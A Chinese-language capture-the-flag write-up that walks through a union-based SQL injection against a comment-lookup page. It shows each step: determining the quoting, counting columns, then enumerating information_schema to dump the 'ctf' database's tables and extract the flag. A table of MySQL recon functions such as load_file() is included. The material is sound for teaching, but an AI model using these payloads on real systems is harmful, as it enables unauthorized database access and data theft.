

*有人留下comments，想看的话就请给个comment id*

# 确定SQL语句
输入`1`试试：
*admin says: "The flag is stored in database."*

猜测可能是以下几种
```sql
select * from <table> where <id>=id
select * from <table> where <id>="id"
select * from <table> where <id>='id'
select * from <table> where (<id>=id)
```


输入
```sql
1'#
```
*admin says: "The flag is stored in database."*

可以查到，所以应该是
`select * from <table> where <id>='id'`

# 判断列数
输入
```sql
1' ordered by 3#
```
正常输出

输入
```sql
1' ordered by 4#
```
错误
所以应该有3列

# 确定输出格式
输入 
```sql
a' union select 1,2,3 #
```
其中已经确定没有`id='a'` 的条目
*2 says: "3"*

所以语句大概是
`{2} says: "{3}"`

# 爆库

这里附一个表
***一些有用的函数***
```
system_user() 系统用户名 
user() 用户名 
current_user() 当前用户名 
session_user()连接数据库的用户名 
database() 数据库名 
version() MYSQL数据库版本 
load_file() MYSQL读取本地文件的函数 
@@datadir 读取数据库路径 
@@basedir MYSQL 安装路径 
@@version_compile_os 操作系统
```
使用`concat()`进行字符串连接，使用`group_concat()`将多个项连接

输入
```sql
a'  union select 1,2,database() #
```
*2 says: "ctf"*

爆出数据库名"ctf"

有提示过flag在数据库里，现在找找"ctf"库还有什么表

***information_schema.tables的一些信息***

| 字段|含义 |
| --- | --- |
|Table_schema|数据表所属的数据库名|
|Table_name|表名称|

输入
```sql
a'  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctf' #
```
*2 says: "flag,user"*

查出有两个表："flag", "user"
flag应该在"flag"表里，再爆出"flag"表里的列名：
```sql
a'  union select 1,2,group_concat( column_name) from information_schema.columns where table_schema='ctf' and table_name='flag'#
```
*2 says: "flag"*

只有一个列：“flag"，直接查询该列获得flag
```sql
a'  union select 1,2,group_concat( flag) from ctf.flag#
```
*2 says: "NeSE{88db33cc40624a459d9227d92f4366bf}"*









